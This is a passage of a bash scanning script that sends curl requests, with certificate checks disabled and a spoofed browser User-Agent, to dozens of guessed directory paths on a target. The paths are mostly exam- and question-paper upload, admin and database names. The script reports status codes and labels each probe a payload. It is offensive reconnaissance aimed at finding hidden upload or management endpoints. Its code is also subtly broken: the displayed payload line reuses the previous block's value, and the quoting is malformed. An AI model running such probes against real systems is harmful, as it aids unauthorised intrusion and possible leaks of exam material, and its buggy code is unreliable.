         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_FileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal-QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal-QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchTransfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchTransfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessingQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessingQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ModuleQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ModuleQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessor_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessor_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ToolQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ToolQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessingQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessingQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperMonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperMonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MgmtQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MgmtQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocDataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocDataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlDataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlDataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ToolQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ToolQPProcessing/"" -H "User-Agent: Mozilla/5.0")
